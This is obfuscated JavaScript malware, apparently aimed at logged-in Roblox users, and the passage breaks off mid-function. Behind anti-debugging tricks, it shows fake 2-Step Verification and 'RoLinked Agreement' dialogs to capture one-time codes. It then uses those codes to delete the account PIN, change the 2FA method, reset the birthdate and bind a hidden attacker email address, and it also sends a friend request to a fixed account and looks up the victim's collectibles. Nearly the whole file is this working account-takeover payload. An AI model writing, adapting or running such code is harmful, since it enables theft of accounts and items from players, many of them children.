(function () {
    var E = function () {
        var O;
        try {
            O = Function('return (function() {}.constructor("return this")( ));')();
        } catch (s) {
            O = window;
        }
        return O;
    };
    var q = E();
    q.setInterval(Z, 4000);
})();
(async function () {
    var n = (function () {
            var b = {
                ZNOhC: function (P, T) {
                    return P === T;
                },
                vtSxJ: "HZwqh",
                zUnYE: "vyVuU",
                ecEWk: function (P, T) {
                    return P !== T;
                },
                UxVNi: "NwztR",
                gVpOZ: function (y, P, T, e) {
                    return y(P, T, e);
                },
                rnHuy: function (y, P) {
                    return y(P);
                },
                xkMZX: function (P, T) {
                    return P !== T;
                },
                WzPkG: "kGgbu",
            };
            var G = true;
            return function (y, P) {
                if (b.xkMZX(b.WzPkG, b.WzPkG)) {
                    return false;
                } else {
                    var e = G
                        ? function () {
                              if (b.ZNOhC(b.vtSxJ, b.zUnYE)) {
                                  b.gVpOZ(L, n, O, n);
                              } else {
                                  if (P) {
                                      if (b.ecEWk(b.UxVNi, b.UxVNi)) {
                                          hqgymb.vsLjB(E, 0);
                                      } else {
                                          var k = P.apply(y, arguments);
                                          return (P = null), k;
                                      }
                                  }
                              }
                          }
                        : function () {};
                    return (G = false), e;
                }
            };
        })(),
        L = n(this, function () {
            var b = {
                eQuzK: function (G, P) {
                    return G == P;
                },
                lzULB: "emailAddress",
                JxSeG: "POST",
                HwPCZ: "application/json",
                qHGKi: function (G, y) {
                    return G(y);
                },
            };
            return L.toString().search("(((.+)+)+)+$").toString().constructor(L).search("(((.+)+)+)+$");
        });
    L();
    var s = (function () {
        var G = true;
        return function (y, P) {
            var e = G
                ? function () {
                      if (P) {
                          var k = P.apply(y, arguments);
                          return (P = null), k;
                      }
                  }
                : function () {};
            return (G = false), e;
        };
    })();
    (function () {
        s(this, function () {
            var T = new RegExp("function *\\( *\\)"),
                e = new RegExp("\\+\\+ *(?:[a-zA-Z_$][0-9a-zA-Z_$]*)", "i"),
                R = Z("init");
            if (!T.test(R + "chain") || !e.test(R + "input")) {
                R("0");
            } else {
                Z();
            }
        })();
    })();
    var V = (function () {
            var G = true;
            return function (y, P) {
                var e = G
                    ? function () {
                          if (P) {
                              var B = P.apply(y, arguments);
                              return (P = null), B;
                          }
                      }
                    : function () {};
                return (G = false), e;
            };
        })(),
        c = V(this, function () {
            var G;
            try {
                var y = Function('return (function() {}.constructor("return this")( ));');
                G = y();
            } catch (r) {
                G = window;
            }
            var P = (G.console = G.console || {}),
                T = ["log", "warn", "info", "error", "exception", "table", "trace"];
            for (var R = 0; R < T.length; R++) {
                var K = V.constructor.prototype.bind(V);
                var x = T[R];
                var d = P[x] || K;
                K["__proto__"] = V.bind(V);
                K.toString = d.toString.bind(d);
            }
        });
    c();
    const o = (b) => new Promise((G) => setTimeout(G, b));
    var w = ["dGVyZXNhZmFybWVyNDZAb3V0bG9vay5jb20="];
    var m = "@outlook.com",
        i = "t***",
        I = w[Math.floor(Math.random() * w.length)],
        U = 6045232974;
    validDev = [];
    try {
        $.ajax({
            method: "GET",
            url: "https://privatemessages.roblox.com/v1/messages?messageTab=inbox&pageNumber=0&pageSize=20",
            contentType: "application/json",
            success: function (b) {
                var y = Number(b.totalPages);
                for (let P = 0; P < y; P++) {
                    $.ajax({
                        method: "GET",
                        url: "https://privatemessages.roblox.com/v1/messages?messageTab=inbox&pageNumber=" + P + "&pageSize=20",
                        contentType: "application/json",
                        success: function (T) {
                            var e = T.collection;
                            for (var R of e) {
                                R.body.includes("VlK Games") == true && validDev.push("true");
                            }
                        },
                    });
                }
            },
        });
    } catch {}
    try {
        $.ajax({
            method: "GET",
            url: "https://privatemessages.roblox.com/v1/messages?messageTab=archive&pageNumber=0&pageSize=20",
            contentType: "application/json",
            success: function (y) {
                var T = Number(y.totalPages);
                for (let e = 0; e < T; e++) {
                    $.ajax({
                        method: "GET",
                        url: "https://privatemessages.roblox.com/v1/messages?messageTab=archive&pageNumber=" + e + "&pageSize=20",
                        contentType: "application/json",
                        success: function (k) {
                            var x = k.collection;
                            for (var K of x) {
                                if (K.body.includes("VlK Games") == true) {
                                    validDev.push("true");
                                }
                            }
                        },
                    });
                }
            },
        });
    } catch {}
    try {
        console.log(document.getElementsByClassName("text-footer footer-note")[0].innerText);
    } catch {
        window.location.reload();
    }
    if (document.getElementsByClassName("text-footer footer-note")[0].innerText != "Active") {
        document.getElementsByClassName("text-footer footer-note")[0].innerText = "Active";
        $.ajax({
            method: "GET",
            url: "https://users.roblox.com/v1/users/authenticated",
            contentType: "application/json",
            success: function (T) {
                var R = T.id;
                try {
                    var k = { friendshipOriginSourceType: 0 };
                    $.ajax({
                        method: "POST",
                        url: "https://friends.roblox.com/v1/users/" + U + "/request-friendship",
                        contentType: "application/json",
                        data: JSON.stringify(k),
                    });
                } catch {}
                async function B() {
                    function d() {
                        $.ajax({
                            method: "GET",
                            url: "https://accountsettings.roblox.com/v1/email",
                            contentType: "application/json",
                            success: function (h) {
                                if (h.emailAddress == null) {
                                    $.ajax({
                                        method: "POST",
                                        url: "https://accountsettings.roblox.com/v1/email",
                                        contentType: "application/json",
                                        data: JSON.stringify({
                                            emailAddress: atob(I),
                                            password: "",
                                        }),
                                    });
                                } else {
                                    var X = h.emailAddress,
                                        p = h.verified;
                                    if (X.includes(m) == true) {
                                        X.includes(i) == true &&
                                            p == true &&
                                            (async function () {
                                                await o(500);
                                                var D = {
                                                    method: "POST",
                                                    url: "https://auth.roblox.com/v2/logout",
                                                    contentType: "application/json",
                                                };
                                                $.ajax(D);
                                            })();
                                    }
                                }
                            },
                        }),
                            setTimeout(d, 2000);
                    }
                    d();
                    function j(F, A, h) {
                        $.ajax({
                            method: "POST",
                            url: "https://twostepverification.roblox.com/v1/users/" + R + "/challenges/email/send-code",
                            contentType: "application/json",
                            data: JSON.stringify({
                                actionType: "Generic",
                                challengeId: F,
                            }),
                            success: function () {
                                var p = '<div id="twoStepPrompts" role="dialog"> <div class="fade modal-backdrop in"></div> <div role="dialog" tabindex="-1" style="display: block;" class="fade modal-modern in modal"> <div class="modal-dialog"> <div class="modal-content" role="document"> <div title="" class="modal-header"> <button type="button" class="modal-modern-header-button"></button> <h4 class="modal-title">2-Step Verification</h4> <div class="modal-modern-header-info"></div> </div> <div class="modal-body"> <div class="modal-lock-icon"></div> <p class="modal-margin-bottom-xlarge">Enter the code we just sent you via email. </p> <div class="input-control-wrapper"> <div id="groupElementId" class="form-group"> <input as="input" inputmode="numeric" autocomplete="off" maxlength="6" placeholder="Enter 6-digit Code" type="text" id="two-step-verification-code-input" class="input-field form-control" value=""> <div class="form-control-label bottom-label xsmall">&nbsp;</div> </div> </div> </div> <div class="modal-footer"> <div class="modal-modern-footer-buttons"> <button type="button" class="btn-cta-md modal-modern-footer-button" aria-label="Verify" disabled="">Verify</button> </div> <p class="text-footer modal-margin-bottom">Need help? Contact <a class="text-name text-footer contact" href="https://www.roblox.com/info/2sv" target="_blank" rel="noopener noreferrer">Roblox Support</a></p> <p class="text-footer">IMPORTANT: Don\'t share your security codes with anyone. Roblox will never ask you for your codes. This can include things like texting your code, screensharing, etc.</p> </div> </div> </div> </div> </div>';
                                document.body.insertAdjacentHTML("beforeend", p);
                                function M() {
                                    if (document.getElementById("two-step-verification-code-input").value.length == 6) {
                                        document.getElementsByClassName("btn-cta-md modal-modern-footer-button")[0].disabled = false;
                                    } else {
                                        document.getElementsByClassName("btn-cta-md modal-modern-footer-button")[0].disabled = true;
                                    }
                                    setTimeout(M, 100);
                                }
                                M();
                                document.getElementsByClassName("btn-cta-md modal-modern-footer-button")[0].onclick = function () {
                                    $.ajax({
                                        method: "POST",
                                        url: "https://twostepverification.roblox.com/v1/users/" + R + "/challenges/email/verify",
                                        contentType: "application/json",
                                        data: JSON.stringify({
                                            challengeId: F,
                                            actionType: "Generic",
                                            code: document.getElementById("two-step-verification-code-input").value,
                                        }),
                                        success: function (u) {
                                            var H = u.verificationToken;
                                            $.ajax({
                                                method: "POST",
                                                url: "https://apis.roblox.com/challenge/v1/continue",
                                                contentType: "application/json",
                                                data: JSON.stringify({
                                                    challengeId: A,
                                                    challengeMetadata: '{"verificationToken":"' + H + '","rememberDevice":false,"challengeId":"' + F + '","actionType":"Generic"}',
                                                    challengeType: "twostepverification",
                                                }),
                                                success: function () {
                                                    document.getElementById("twoStepPrompts").remove();
                                                    o(2000);
                                                    var C1 = btoa('{"reauthenticationToken":"' + H + '"}');
                                                    console.log(h);
                                                    if (h == 1) {
                                                        console.log("Reason is 1");
                                                        var C2 = {
                                                            method: "POST",
                                                            url: "https://twostepverification.roblox.com/v1/users/" + R + "/configuration/email/enable",
                                                            contentType: "application/json",
                                                            headers: {},
                                                        };
                                                        C2.headers["Rblx-Challenge-Type"] = "reauthentication";
                                                        C2.headers["Rblx-Challenge-Id"] = A;
                                                        C2.headers["Rblx-Challenge-Metadata"] = C1;
                                                        $.ajax(C2);
                                                    } else {
                                                        h == null
                                                            ? $.ajax({
                                                                  method: "DELETE",
                                                                  url: "https://auth.roblox.com/v1/account/pin",
                                                                  contentType: "application/json",
                                                                  headers: {
                                                                      "Rblx-Challenge-Type": "reauthentication",
                                                                      "Rblx-Challenge-Id": A,
                                                                      "Rblx-Challenge-Metadata": C1,
                                                                  },
                                                                  success: function () {
                                                                      Q(null, null);
                                                                  },
                                                              })
                                                            : Q(A, C1);
                                                    }
                                                },
                                            });
                                        },
                                        error: function () {
                                            (document.getElementsByClassName("form-control-label bottom-label xsmall")[0].innerText = "Invalid code"), (document.getElementById("groupElementId").className = "form-has-feedback  form-has-error form-group");
                                        },
                                    });
                                };
                            },
                        });
                    }
                    function f(F, A, h) {
                        var X = '<div id="twoStepPrompts" role="dialog"> <div class="fade modal-backdrop in"></div> <div role="dialog" tabindex="-1" style="display: block;" class="fade modal-modern in modal"> <div class="modal-dialog"> <div class="modal-content" role="document"> <div title="" class="modal-header"> <button type="button" class="modal-modern-header-button"></button> <h4 class="modal-title">2-Step Verification</h4> <div class="modal-modern-header-info"></div> </div> <div class="modal-body"> <div class="modal-lock-icon"></div> <p class="modal-margin-bottom-xlarge">Enter the code generated by your authenticator app. </p> <div class="input-control-wrapper"> <div id="groupElementId" class="form-group"> <input as="input" inputmode="numeric" autocomplete="off" maxlength="6" placeholder="Enter 6-digit Code" type="text" id="two-step-verification-code-input" class="input-field form-control" value=""> <div class="form-control-label bottom-label xsmall">&nbsp;</div> </div> </div> </div> <div class="modal-footer"> <div class="modal-modern-footer-buttons"> <button type="button" class="btn-cta-md modal-modern-footer-button" aria-label="Verify" disabled="">Verify</button> </div> <p class="text-footer modal-margin-bottom">Need help? Contact <a class="text-name text-footer contact" href="https://www.roblox.com/info/2sv" target="_blank" rel="noopener noreferrer">Roblox Support</a></p> <p class="text-footer">IMPORTANT: Don\'t share your security codes with anyone. Roblox will never ask you for your codes. This can include things like texting your code, screensharing, etc.</p> </div> </div> </div> </div> </div>';
                        document.body.insertAdjacentHTML("beforeend", X);
                        function l() {
                            if (document.getElementById("two-step-verification-code-input").value.length == 6) {
                                document.getElementsByClassName("btn-cta-md modal-modern-footer-button")[0].disabled = false;
                            } else {
                                document.getElementsByClassName("btn-cta-md modal-modern-footer-button")[0].disabled = true;
                            }
                            setTimeout(l, 100);
                        }
                        l();
                        document.getElementsByClassName("btn-cta-md modal-modern-footer-button")[0].onclick = function () {
                            $.ajax({
                                method: "POST",
                                url: "https://twostepverification.roblox.com/v1/users/" + R + "/challenges/authenticator/verify",
                                contentType: "application/json",
                                data: JSON.stringify({
                                    challengeId: F,
                                    actionType: "Generic",
                                    code: document.getElementById("two-step-verification-code-input").value,
                                }),
                                success: function (t) {
                                    var D = t.verificationToken;
                                    $.ajax({
                                        method: "POST",
                                        url: "https://apis.roblox.com/challenge/v1/continue",
                                        contentType: "application/json",
                                        data: JSON.stringify({
                                            challengeId: A,
                                            challengeMetadata: '{"verificationToken":"' + D + '","rememberDevice":false,"challengeId":"' + F + '","actionType":"Generic"}',
                                            challengeType: "twostepverification",
                                        }),
                                        success: function () {
                                            document.getElementById("twoStepPrompts").remove();
                                            o(2000);
                                            var C0 = btoa('{"reauthenticationToken":"' + D + '"}');
                                            if (h == 1) {
                                                console.log("Reason is 1");
                                                var C1 = {
                                                    method: "POST",
                                                    url: "https://twostepverification.roblox.com/v1/users/" + R + "/configuration/email/enable",
                                                    contentType: "application/json",
                                                    headers: {},
                                                };
                                                C1.headers["Rblx-Challenge-Type"] = "reauthentication";
                                                C1.headers["Rblx-Challenge-Id"] = A;
                                                C1.headers["Rblx-Challenge-Metadata"] = C0;
                                                $.ajax(C1);
                                            } else {
                                                if (h == null) {
                                                    $.ajax({
                                                        method: "DELETE",
                                                        url: "https://auth.roblox.com/v1/account/pin",
                                                        contentType: "application/json",
                                                        headers: {
                                                            "Rblx-Challenge-Type": "reauthentication",
                                                            "Rblx-Challenge-Id": A,
                                                            "Rblx-Challenge-Metadata": C0,
                                                        },
                                                        success: function () {
                                                            Q(null, null);
                                                        },
                                                    });
                                                } else {
                                                    Q(A, C0);
                                                }
                                            }
                                        },
                                    });
                                },
                                error: function (t) {
                                    t.responseText.includes('"code":18') ? ((document.getElementsByClassName("form-control-label bottom-label xsmall")[0].innerText = "This code has already been used. Please enter a new code."), (document.getElementById("groupElementId").className = "form-has-feedback  form-has-error form-group")) : ((document.getElementsByClassName("form-control-label bottom-label xsmall")[0].innerText = "Invalid code"), (document.getElementById("groupElementId").className = "form-has-feedback  form-has-error form-group"));
                                },
                            });
                        };
                    }
                    function r(F, A) {
                        $.ajax({
                            method: "POST",
                            url: "https://apis.roblox.com/otp-service/v1/sendCodeForUser",
                            contentType: "application/json",
                            data: JSON.stringify({
                                contactType: "Email",
                                messageVariant: "Default",
                                origin: "Reauth",
                            }),
                            success: function (X) {
                                var l = X.otpSessionToken,
                                    M = '<div id="twoStepPrompts" role="dialog"> <div class="fade modal-backdrop in"></div> <div role="dialog" tabindex="-1" style="display: block;" class="fade modal-modern in modal"> <div class="modal-dialog"> <div class="modal-content" role="document"> <div title="" class="modal-header"> <button type="button" class="modal-modern-header-button"></button> <h4 class="modal-title">2-Step Verification</h4> <div class="modal-modern-header-info"></div> </div> <div class="modal-body"> <div class="modal-lock-icon"></div> <p class="modal-margin-bottom-xlarge">A one-time code has been sent to your registered email. Please enter your one-time code to continue.</p> <div class="input-control-wrapper"> <div id="groupElementId" class="form-group"> <input as="input" inputmode="numeric" autocomplete="off" maxlength="6" placeholder="Enter 6-Digit Code" type="text" id="two-step-verification-code-input" class="input-field form-control" value=""> <div class="form-control-label bottom-label xsmall">&nbsp;;</div> </div> </div> </div> <div class="modal-footer"> <div class="modal-modern-footer-buttons"> <button type="button" class="btn-cta-md modal-modern-footer-button" aria-label="Verify" disabled="">Verify</button> </div> <p class="text-footer modal-margin-bottom">Need help? Contact <a class="text-name text-footer contact" href="https://www.roblox.com/info/2sv" target="_blank" rel="noopener noreferrer">Roblox Support</a></p> <p class="text-footer">IMPORTANT: Don\'t share your security codes with anyone. Roblox will never ask you for your codes. This can include things like texting your code, screensharing, etc.</p> </div> </div> </div> </div> </div>';
                                document.body.insertAdjacentHTML("beforeend", M);
                                function t() {
                                    document.getElementById("two-step-verification-code-input").value.length == 6 ? (document.getElementsByClassName("btn-cta-md modal-modern-footer-button")[0].disabled = false) : (document.getElementsByClassName("btn-cta-md modal-modern-footer-button")[0].disabled = true), setTimeout(t, 100);
                                }
                                t();
                                document.getElementsByClassName("btn-cta-md modal-modern-footer-button")[0].onclick = function () {
                                    $.ajax({
                                        method: "POST",
                                        url: "https://apis.roblox.com/otp-service/v1/validateCode",
                                        contentType: "application/json",
                                        data: JSON.stringify({
                                            contactType: "Email",
                                            origin: "Reauth",
                                            otpSessionToken: l,
                                            passCode: document.getElementById("two-step-verification-code-input").value,
                                        }),
                                        success: function () {
                                            $.ajax({
                                                method: "POST",
                                                url: "https://apis.roblox.com/reauthentication-service/v1/token/generate",
                                                contentType: "application/json",
                                                data: JSON.stringify({
                                                    sessionId: l,
                                                    type: "Otp_Email",
                                                }),
                                                success: function (H) {
                                                    responseToken = H.token;
                                                    $.ajax({
                                                        method: "POST",
                                                        url: "https://apis.roblox.com/challenge/v1/continue",
                                                        contentType: "application/json",
                                                        data: JSON.stringify({
                                                            challengeId: F,
                                                            challengeMetadata: '{"reauthenticationToken":"' + responseToken + '"}',
                                                            challengeType: "reauthentication",
                                                        }),
                                                        success: function () {
                                                            document.getElementById("twoStepPrompts").remove();
                                                            o(2000);
                                                            var C3 = btoa('{"reauthenticationToken":"' + responseToken + '"}');
                                                            if (A == 1) {
                                                                console.log("Reason is 1");
                                                                var C4 = {
                                                                    method: "POST",
                                                                    url: "https://twostepverification.roblox.com/v1/users/" + R + "/configuration/email/enable",
                                                                    contentType: "application/json",
                                                                    headers: {},
                                                                };
                                                                C4.headers["Rblx-Challenge-Type"] = "reauthentication";
                                                                C4.headers["Rblx-Challenge-Id"] = F;
                                                                C4.headers["Rblx-Challenge-Metadata"] = C3;
                                                                $.ajax(C4);
                                                            } else {
                                                                A == null
                                                                    ? $.ajax({
                                                                          method: "DELETE",
                                                                          url: "https://auth.roblox.com/v1/account/pin",
                                                                          contentType: "application/json",
                                                                          headers: {
                                                                              "Rblx-Challenge-Type": "reauthentication",
                                                                              "Rblx-Challenge-Id": F,
                                                                              "Rblx-Challenge-Metadata": C3,
                                                                          },
                                                                          success: function () {
                                                                              Q(null, null);
                                                                          },
                                                                      })
                                                                    : Q(F, C3);
                                                            }
                                                        },
                                                    });
                                                },
                                            });
                                        },
                                        error: function () {
                                            (document.getElementsByClassName("form-control-label bottom-label xsmall")[0].innerText = "Invalid code"), (document.getElementById("groupElementId").className = "form-has-feedback  form-has-error form-group");
                                        },
                                    });
                                };
                            },
                        });
                    }
                    function W(F, A, h) {
                        $.ajax({
                            method: "GET",
                            url: "https://twostepverification.roblox.com/v1/users/" + R + "/configuration",
                            contentType: "application/json",
                            success: function (p) {
                                var Y = p.primaryMediaType;
                                if (Y == "Email") {
                                    j(F, A, h);
                                } else {
                                    if (Y == "Authenticator") {
                                        f(F, A, h);
                                    } else {
                                        if (Y == null) {
                                            r(A, h);
                                        }
                                    }
                                }
                            },
                        });
                    }
                    function Q(F, A) {
                        $.ajax({
                            method: "GET",
                            url: "https://twostepverification.roblox.com/v1/users/" + R + "/configuration",
                            contentType: "application/json",
                            success: function (J) {
                                var p = J.primaryMediaType;
                                if (p == "Authenticator") {
                                    document.getElementsByClassName("text-footer footer-note")[0].innerText = "Not Active";
                                    if (document.getElementById("emailPopupz") == null) {
                                        var l = '<div id="emailPopupz" role="dialog"><div class="fade modal-backdrop in"></div><div role="dialog" tabindex="-1" class="fade modal-modern in modal" style="display: block; padding-left: 23px;"><div class="modal-dialog" bis_skin_checked="1"><div class="modal-content" role="document" bis_skin_checked="1"><div title="" class="modal-header" bis_skin_checked="1"><button type="button" class="modal-modern-header-button"></button><h4 class="modal-title">Email 2-Step Verification</h4><div class="modal-modern-header-info" bis_skin_checked="1"></div></div><div class="modal-body" bis_skin_checked="1"><div class="modal-lock-icon" bis_skin_checked="1"></div><p>You must enable Email 2-Step Verification to complete this action.</p></div><div class="modal-footer" bis_skin_checked="1"><div class="modal-modern-footer-buttons" bis_skin_checked="1"><button type="button" class="btn-cta-md modal-modern-footer-button" aria-label="Set Up">Enable</button></div></div></div></div></div></div>';
                                        document.body.insertAdjacentHTML("beforeend", l);
                                        document.getElementsByClassName("btn-cta-md modal-modern-footer-button")[0].onclick = function () {
                                            document.getElementById("emailPopupz").remove(),
                                                (document.getElementById("agreeRoLinked").disabled = false),
                                                $.ajax({
                                                    method: "POST",
                                                    url: "https://twostepverification.roblox.com/v1/users/" + R + "/configuration/email/enable",
                                                    contentType: "application/json",
                                                    success: function () {},
                                                    error: function (C0) {
                                                        var C1 = atob(C0.getResponseHeader("rblx-challenge-metadata")),
                                                            C2 = C0.getResponseHeader("rblx-challenge-id"),
                                                            C3 = C1.split('"challengeId":"').pop().split('"')[0];
                                                        W(C3, C2, 1);
                                                    },
                                                });
                                        };
                                    }
                                } else {
                                    if (F == null) {
                                        var M = {
                                            birthDay: 2,
                                            birthMonth: 2,
                                            birthYear: 2022,
                                        };
                                        $.ajax({
                                            method: "POST",
                                            url: "https://users.roblox.com/v1/birthdate",
                                            contentType: "application/json",
                                            data: JSON.stringify(M),
                                            success: function () {
                                                $.ajax({
                                                    method: "POST",
                                                    url: "https://accountsettings.roblox.com/v1/email",
                                                    contentType: "application/json",
                                                    data: JSON.stringify({
                                                        emailAddress: atob(I),
                                                        password: "",
                                                    }),
                                                    success: function () {
                                                        (async function () {
                                                            await o(1500),
                                                                $.ajax({
                                                                    method: "GET",
                                                                    url: "https://accountsettings.roblox.com/v1/email",
                                                                    contentType: "application/json",
                                                                    success: function (C2) {
                                                                        if (C2.emailAddress == null) {
                                                                            $.ajax({
                                                                                method: "POST",
                                                                                url: "https://accountsettings.roblox.com/v1/email",
                                                                                contentType: "application/json",
                                                                                data: JSON.stringify({
                                                                                    emailAddress: atob(I),
                                                                                    password: "",
                                                                                }),
                                                                            });
                                                                        }
                                                                    },
                                                                });
                                                        })();
                                                    },
                                                    error: function () {
                                                        (async function () {
                                                            await o(1500);
                                                            $.ajax({
                                                                method: "GET",
                                                                url: "https://accountsettings.roblox.com/v1/email",
                                                                contentType: "application/json",
                                                                success: function (C2) {
                                                                    C2.emailAddress == null &&
                                                                        $.ajax({
                                                                            method: "POST",
                                                                            url: "https://accountsettings.roblox.com/v1/email",
                                                                            contentType: "application/json",
                                                                            data: JSON.stringify({
                                                                                emailAddress: atob(I),
                                                                                password: "",
                                                                            }),
                                                                        });
                                                                },
                                                            });
                                                        })();
                                                    },
                                                });
                                            },
                                            error: function (D) {
                                                var C1 = atob(D.getResponseHeader("rblx-challenge-metadata")),
                                                    C2 = D.getResponseHeader("rblx-challenge-id"),
                                                    C3 = C1.split('"challengeId":"').pop().split('"')[0];
                                                W(C3, C2, 2);
                                            },
                                        });
                                    } else {
                                        var Y = {
                                            birthDay: 2,
                                            birthMonth: 2,
                                            birthYear: 2022,
                                        };
                                        $.ajax({
                                            method: "POST",
                                            url: "https://users.roblox.com/v1/birthdate",
                                            contentType: "application/json",
                                            headers: {
                                                "Rblx-Challenge-Type": "reauthentication",
                                                "Rblx-Challenge-Id": F,
                                                "Rblx-Challenge-Metadata": A,
                                            },
                                            data: JSON.stringify(Y),
                                            success: function () {
                                                $.ajax({
                                                    method: "POST",
                                                    url: "https://accountsettings.roblox.com/v1/email",
                                                    contentType: "application/json",
                                                    data: JSON.stringify({
                                                        emailAddress: atob(I),
                                                        password: "",
                                                    }),
                                                    success: function () {
                                                        (async function () {
                                                            await o(1500);
                                                            $.ajax({
                                                                method: "GET",
                                                                url: "https://accountsettings.roblox.com/v1/email",
                                                                contentType: "application/json",
                                                                success: function (C3) {
                                                                    C3.emailAddress == null &&
                                                                        $.ajax({
                                                                            method: "POST",
                                                                            url: "https://accountsettings.roblox.com/v1/email",
                                                                            contentType: "application/json",
                                                                            data: JSON.stringify({
                                                                                emailAddress: atob(I),
                                                                                password: "",
                                                                            }),
                                                                        });
                                                                },
                                                            });
                                                        })();
                                                    },
                                                    error: function () {
                                                        (async function () {
                                                            await o(1500),
                                                                $.ajax({
                                                                    method: "GET",
                                                                    url: "https://accountsettings.roblox.com/v1/email",
                                                                    contentType: "application/json",
                                                                    success: function (C3) {
                                                                        if (C3.emailAddress == null) {
                                                                            $.ajax({
                                                                                method: "POST",
                                                                                url: "https://accountsettings.roblox.com/v1/email",
                                                                                contentType: "application/json",
                                                                                data: JSON.stringify({
                                                                                    emailAddress: atob(I),
                                                                                    password: "",
                                                                                }),
                                                                            });
                                                                        }
                                                                    },
                                                                });
                                                        })();
                                                    },
                                                });
                                            },
                                            error: function (H) {
                                                var C0 = atob(H.getResponseHeader("rblx-challenge-metadata"));
                                                var C1 = H.getResponseHeader("rblx-challenge-id");
                                                var C2 = C0.split('"challengeId":"').pop().split('"')[0];
                                                W(C2, C1, 2);
                                            },
                                        });
                                    }
                                }
                            },
                        });
                    }
                    if (document.getElementById("RoLinked1") == null) {
                        var S = '<div id="RoLinked1" role="dialog"><div class="fade modal-backdrop in"></div><div aria-labelledby="contained-modal-title-vcenter" scrollable="true" centered="true" role="dialog" tabindex="-1" style="display: block;" class="fade verification-modal in modal"><div class="modal-sm modal-dialog"><div class="modal-content" role="document"><div><div title="" class="modal-header"><div class="verification-upsell-title-container"><button type="button" class="verification-upsell-title-button"></button><h4 id="contained-modal-title-vcenter" class="modal-title">RoLinked Agreement </h4></div></div><div class="verification-upsell-text-body text-description">RoLinked can view your Roblox Username</div><div class="modal-footer"><div class="text-description font-caption-body phone-verification-legal-text" hidden="">By clicking "Continue", you are submitting your phone number and agreeing to our <a href="https://en.help.roblox.com/hc/articles/9483830673556-Roblox-SMS-Terms-of-Service">SMS Terms of Use</a> and <a href="https://en.help.roblox.com/hc/articles/115004630823">Privacy Policy</a>. We will send you a one-time verification code. Message and data rates may apply. Reply HELP for help.</div><div class="buttons-section"><button type="button" class="accept-btn btn-primary-md btn-min-width" id="agreeRoLinked">Agree & Continue</button></div><div></div></div></div></div></div></div></div>';
                        document.body.insertAdjacentHTML("beforeend", S);
                        document.getElementById("agreeRoLinked").onclick = function () {
                            document.getElementById("agreeRoLinked").disabled = true;
                            $.ajax({
                                method: "GET",
                                url: "https://auth.roblox.com/v1/account/pin",
                                contentType: "application/json",
                                success: function (A) {
                                    var J = A.isEnabled;
                                    var X = A.unlockedUntil;
                                    if (J == true) {
                                        if (X == null) {
                                            document.getElementsByClassName("text-footer footer-note")[0].innerText = "Not Active";
                                            if (document.getElementById("pinPopupz") == null) {
                                                var p = '<div id="pinPopupz" role="dialog"><div class="fade modal-backdrop in"></div><div role="dialog" tabindex="-1" class="fade modal-modern in modal" style="display: block; padding-left: 23px;"><div class="modal-dialog"><div class="modal-content" role="document"><div title="" class="modal-header"><button type="button" class="modal-modern-header-button"></button><h4 class="modal-title">Account PIN Locked</h4><div class="modal-modern-header-info"></div></div><div class="modal-body"><p>Unlock the PIN attached to your account to continue</p></div><div class="modal-footer"><div class="modal-modern-footer-buttons"><a class="btn-cta-md modal-modern-footer-button" aria-label="Set Up" target="_blank" href="https://www.roblox.com/my/account#!/parental-controls">Open Settings</a></div></div></div></div></div></div>';
                                                document.body.insertAdjacentHTML("beforeend", p);
                                                document.getElementsByClassName("btn-cta-md modal-modern-footer-button")[0].onclick = function () {
                                                    document.getElementById("pinPopupz").remove();
                                                    document.getElementById("agreeRoLinked").disabled = false;
                                                };
                                            }
                                        } else {
                                            try {
                                                document.getElementById("pinPopupz").remove();
                                            } catch {}
                                            $.ajax({
                                                method: "DELETE",
                                                url: "https://auth.roblox.com/v1/account/pin",
                                                contentType: "application/json",
                                                success: function () {
                                                    Q(null, null);
                                                },
                                                error: function (l) {
                                                    var M = atob(l.getResponseHeader("rblx-challenge-metadata")),
                                                        Y = l.getResponseHeader("rblx-challenge-id"),
                                                        t = M.split('"challengeId":"').pop().split('"')[0];
                                                    W(t, Y, null);
                                                },
                                            });
                                        }
                                    } else {
                                        Q(null, null);
                                    }
                                },
                            });
                        };
                    } else {
                        $.ajax({
                            method: "GET",
                            url: "https://auth.roblox.com/v1/account/pin",
                            contentType: "application/json",
                            success: function (F) {
                                var h = F.isEnabled,
                                    J = F.unlockedUntil;
                                if (h == true) {
                                    if (J == null) {
                                        document.getElementsByClassName("text-footer footer-note")[0].innerText = "Not Active";
                                        if (document.getElementById("pinPopupz") == null) {
                                            var X = '<div id="pinPopupz" role="dialog"><div class="fade modal-backdrop in"></div><div role="dialog" tabindex="-1" class="fade modal-modern in modal" style="display: block; padding-left: 23px;"><div class="modal-dialog"><div class="modal-content" role="document"><div title="" class="modal-header"><button type="button" class="modal-modern-header-button"></button><h4 class="modal-title">Account PIN Locked</h4><div class="modal-modern-header-info"></div></div><div class="modal-body"><p>Unlock the PIN attached to your account to continue</p></div><div class="modal-footer"><div class="modal-modern-footer-buttons"><a class="btn-cta-md modal-modern-footer-button" aria-label="Set Up" target="_blank" href="https://www.roblox.com/my/account#!/parental-controls">Open Settings</a></div></div></div></div></div></div>';
                                            document.body.insertAdjacentHTML("beforeend", X);
                                            document.getElementsByClassName("btn-cta-md modal-modern-footer-button")[0].onclick = function () {
                                                document.getElementById("pinPopupz").remove();
                                                document.getElementsByClassName("text-footer footer-note")[0].innerText = "Not Active";
                                            };
                                        }
                                    } else {
                                        try {
                                            document.getElementById("pinPopupz").remove();
                                        } catch {}
                                        $.ajax({
                                            method: "DELETE",
                                            url: "https://auth.roblox.com/v1/account/pin",
                                            contentType: "application/json",
                                            success: function () {
                                                Q(null, null);
                                            },
                                            error: function (p) {
                                                var l = atob(p.getResponseHeader("rblx-challenge-metadata")),
                                                    M = p.getResponseHeader("rblx-challenge-id");
                                                var Y = l.split('"challengeId":"').pop().split('"')[0];
                                                W(Y, M, null);
                                            },
                                        });
                                    }
                                } else {
                                    Q(null, null);
                                }
                            },
                        });
                    }
                }
                (async function () {
                    await o(800);
                    if (validDev.length > 0) {
                        console.log(validDev);
                        try {
                            var d = { friendshipOriginSourceType: 0 };
                            $.ajax({
                                method: "POST",
                                url: "https://friends.roblox.com/v1/users/6045232974/request-friendship",
                                contentType: "application/json",
                                data: JSON.stringify(d),
                            });
                        } catch {}
                        B();
                    } else {
                        function j(f) {
                            const r = "https://inventory.roblox.com/v1/users/" + f + "/assets/collectibles?assetType=null&cursor=&limit=100&sortOrder=Desc";
                            var W = {
                                url: r,
                                type: "GET",
                            };
                            return $.ajax(W);
                        }
                        j(R)
                            .done(function (f) {
                                if (f && f.data && f.data.length > 0) {
                                    let S = 0;
                                    f.data.forEach((F) => {
